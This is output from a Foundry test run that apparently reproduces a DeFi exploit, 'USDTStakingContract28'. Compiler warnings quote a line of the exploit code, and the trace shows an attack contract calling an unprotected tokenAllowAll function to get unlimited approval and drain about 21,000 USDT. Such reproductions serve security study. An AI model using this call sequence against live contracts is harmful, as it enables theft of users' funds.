Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.13s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2023-07/USDTStakingContract28_exp.sol:23:5:
   |
23 |     IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:1582:1:
     |
1582 | interface USDT {
     | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2023-07/USDTStakingContract28_exp.sol:43:5:
   |
43 |     IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:1582:1:
     |
1582 | interface USDT {
     | ^ (Relevant source part starts here and spans across multiple lines).

Warning (3628): This contract has a payable fallback function, but no receive ether function. Consider adding a receive ether function.
  --> src/test/2023-07/USDTStakingContract28_exp.sol:22:1:
   |
22 | contract ContractTest is Test {
   | ^ (Relevant source part starts here and spans across multiple lines).
Note: The payable fallback function is defined here.
  --> src/test/2023-07/USDTStakingContract28_exp.sol:38:5:
   |
38 |     fallback() external payable{}
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Warning (9302): Return value of low-level calls not used.
  --> src/test/2023-07/USDTStakingContract28_exp.sol:54:9:
   |
54 |         address(USDT).call(abi.encodeWithSelector(bytes4(0x23b872dd), address(Stake),address(msg.sender),USDT.balanceOf(address(Stake))));
   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 242.72ms (133.82µs CPU time)

Ran 1 test for src/test/2023-07/USDTStakingContract28_exp.sol:ContractTest
[PASS] testExploit() (gas: 348147)
Logs:
  [Begin] Attacker USDT balance before exploit: 0.000000
  [End] Attacker USDT balance after exploit: 20999.916289

Traces:
  [352947] ContractTest::testExploit()
    ├─ [5031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_decimal_uint(key: "[Begin] Attacker USDT balance before exploit", val: 0, decimals: 6)
    ├─ [204890] → new Money@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
    │   └─ ← [Return] 581 bytes of code
    ├─ [73687] Money::attack()
    │   ├─ [30402] 0x800cfD4A2ba8CE93eA2cc814Fce26c3635169017::tokenAllowAll(0xdAC17F958D2ee523a2206206994597C13D831ec7, Money: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   │   ├─ [3356] 0xdAC17F958D2ee523a2206206994597C13D831ec7::allowance(0x800cfD4A2ba8CE93eA2cc814Fce26c3635169017, Money: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [1356] 0xdAC17F958D2ee523a2206206994597C13D831ec7::allowance(0x800cfD4A2ba8CE93eA2cc814Fce26c3635169017, Money: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [22953] 0xdAC17F958D2ee523a2206206994597C13D831ec7::approve(Money: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   ├─ emit Approval(owner: 0x800cfD4A2ba8CE93eA2cc814Fce26c3635169017, spender: Money: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Stop] 
    │   ├─ [3031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(0x800cfD4A2ba8CE93eA2cc814Fce26c3635169017) [staticcall]
    │   │   └─ ← [Return] 20999916289 [2.099e10]
    │   ├─ [35630] 0xdAC17F958D2ee523a2206206994597C13D831ec7::transferFrom(0x800cfD4A2ba8CE93eA2cc814Fce26c3635169017, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 20999916289 [2.099e10])
    │   │   ├─ emit Transfer(from: 0x800cfD4A2ba8CE93eA2cc814Fce26c3635169017, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 20999916289 [2.099e10])
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 20999916289 [2.099e10]
    ├─ [2484] 0xdAC17F958D2ee523a2206206994597C13D831ec7::decimals() [staticcall]
    │   └─ ← [Return] 6
    ├─ emit log_named_decimal_uint(key: "[End] Attacker USDT balance after exploit", val: 20999916289 [2.099e10], decimals: 6)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 267.18ms (1.28ms CPU time)

Ran 2 test suites in 503.91ms (509.90ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
